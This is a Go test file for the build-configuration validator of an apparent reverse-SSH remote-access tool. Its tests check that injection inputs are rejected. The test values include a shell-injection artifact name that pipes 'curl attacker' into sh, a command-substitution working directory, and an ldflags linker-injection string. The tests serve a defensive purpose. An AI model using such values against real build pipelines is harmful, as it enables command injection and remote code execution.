package webserver

import (
	"encoding/json"
	"go/parser"
	"go/token"
	"os"
	"path/filepath"
	"testing"
)

func TestValidateBuildConfigAcceptsSafeValues(t *testing.T) {
	config := BuildConfig{
		Name:              "agent-linux-amd64",
		Comment:           "release candidate",
		Owners:            "alice,bob",
		ConnectBackAdress: "https://127.0.0.1:8443",
		Proxy:             "http://proxy.local:8080",
		SNI:               "edge.internal",
		LogLevel:          "INFO",
		WorkingDirectory:  "/opt/wrssh",
		NTLMProxyCreds:    `DOMAIN\\user:pass`,
		VersionString:     "v1.2.3-test",
	}

	if err := validateBuildConfig(config); err != nil {
		t.Fatalf("expected safe config to pass validation: %v", err)
	}
}

func TestValidateBuildConfigRejectsUnsafeArtifactName(t *testing.T) {
	if err := validateBuildConfig(BuildConfig{Name: "bad $(curl attacker|sh)"}); err == nil {
		t.Fatal("expected unsafe artifact name to be rejected")
	}
}

func TestValidateBuildConfigRejectsLdflagsInjection(t *testing.T) {
	config := BuildConfig{
		Name:              "agent",
		ConnectBackAdress: "127.0.0.1:2222",
		VersionString:     "v1 -linkmode external -extld=/tmp/poc",
	}

	if err := validateBuildConfig(config); err == nil {
		t.Fatal("expected ldflags injection payload to be rejected")
	}
}

func TestValidateBuildConfigRejectsUnsafeWorkingDirectory(t *testing.T) {
	config := BuildConfig{
		Name:             "agent",
		WorkingDirectory: `/tmp/"$(id)"`,
	}

	if err := validateBuildConfig(config); err == nil {
		t.Fatal("expected unsafe working directory to be rejected")
	}
}

func TestValidateBuildConfigRejectsMultiLineComment(t *testing.T) {
	config := BuildConfig{
		Name:    "agent",
		Comment: "hello\nworld",
	}

	if err := validateBuildConfig(config); err == nil {
		t.Fatal("expected multiline comment to be rejected")
	}
}

func TestNormalizeModuleBuildTags(t *testing.T) {
	tags, err := normalizeModuleBuildTags([]string{" pscan ", "execass", "pscan", ""})
	if err != nil {
		t.Fatalf("normalizeModuleBuildTags returned error: %v", err)
	}
	if len(tags) != 2 || tags[0] != "execass" || tags[1] != "pscan" {
		t.Fatalf("tags = %v, want [execass pscan]", tags)
	}
}

func TestValidateBuildConfigRejectsUnsupportedBuildTag(t *testing.T) {
	if err := validateBuildConfig(BuildConfig{BuildTags: []string{"unsafe"}}); err == nil {
		t.Fatal("expected unsupported build tag to be rejected")
	}
}

func TestPrepareBusyBoxOverlayUsesConfiguredBinary(t *testing.T) {
	busyboxPath := filepath.Join(t.TempDir(), "busybox-amd64")
	if err := os.WriteFile(busyboxPath, []byte("fake-busybox"), 0700); err != nil {
		t.Fatalf("write fake busybox: %v", err)
	}
	t.Setenv("RSSH_BUSYBOX_AMD64_PATH", busyboxPath)

	overlayPath, cleanup, err := prepareBusyBoxOverlay("linux", "amd64")
	if err != nil {
		t.Fatalf("prepare busybox overlay: %v", err)
	}
	defer cleanup()

	overlayBytes, err := os.ReadFile(overlayPath)
	if err != nil {
		t.Fatalf("read overlay: %v", err)
	}

	var overlay goBuildOverlay
	if err := json.Unmarshal(overlayBytes, &overlay); err != nil {
		t.Fatalf("decode overlay: %v", err)
	}

	generatedPath := overlay.Replace[filepath.Join(projectRoot, "internal/client/busybox/embedded.go")]
	if generatedPath == "" {
		t.Fatalf("expected embedded busybox source replacement in overlay: %#v", overlay.Replace)
	}

	generatedSource, err := os.ReadFile(generatedPath)
	if err != nil {
		t.Fatalf("read generated source: %v", err)
	}
	if _, err := parser.ParseFile(token.NewFileSet(), generatedPath, generatedSource, 0); err != nil {
		t.Fatalf("generated source is not valid Go: %v", err)
	}
}

func TestPrepareBusyBoxOverlayRejectsNonLinuxTarget(t *testing.T) {
	if _, _, err := prepareBusyBoxOverlay("windows", "amd64"); err == nil {
		t.Fatal("expected non-linux busybox overlay target to be rejected")
	}
}
